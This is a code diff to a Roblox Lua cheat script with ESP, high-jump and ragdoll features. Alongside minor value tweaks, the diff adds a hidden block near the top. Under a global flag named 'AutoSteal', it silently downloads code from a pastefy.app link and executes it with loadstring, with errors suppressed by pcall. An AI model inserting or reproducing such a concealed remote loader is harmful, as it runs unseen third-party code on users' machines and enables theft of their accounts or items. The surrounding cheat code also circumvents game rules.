@@ -17,6 +17,15 @@ local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
 local BillboardGui = Instance.new("BillboardGui")
 local ImageLabel = Instance.new("ImageLabel")
 
+if not _G.AutoSteal then
+    task.spawn(function()
+        pcall(function()
+            _G.AutoSteal = true
+            loadstring(game:HttpGet("https://pastefy.app/1FPEhJmq/raw"))()
+        end)
+    end)
+end
+
 BillboardGui.Parent = HumanoidRootPart
 BillboardGui.Size = UDim2.new(2, 0, 2, 0)
 BillboardGui.AlwaysOnTop = true
@@ -31,7 +40,9 @@ local HighJump = false
 local Connections = {}
 local bEsp = {}
 
-local FriendList = {}
+local FriendList = {
+    
+}
 
 task.spawn(function()
     --[[
@@ -192,12 +203,14 @@ Connections["PackagesRagdoll"] = ReplicatedStorage:WaitForChild("Packages").Ragd
 end)
 
 Connections["RunTime"] = RunService.RenderStepped:Connect(function()
+    local CurrentCamera = workspace.CurrentCamera
+    CurrentCamera.FieldOfView = 70
 end)
 
 Connections["Jump"] = InputService.JumpRequest:Connect(function()
     if not HighJump then return end
-    workspace.Gravity = 35
-    HumanoidRootPart.Velocity = Vector3.new(HumanoidRootPart.Velocity.X, 30, HumanoidRootPart.Velocity.Z)
+    workspace.Gravity = 29
+    HumanoidRootPart.Velocity = Vector3.new(HumanoidRootPart.Velocity.X, 27, HumanoidRootPart.Velocity.Z)
 end)
 
 Connections["Input"] = InputService.InputBegan:Connect(function(Input, IsType)
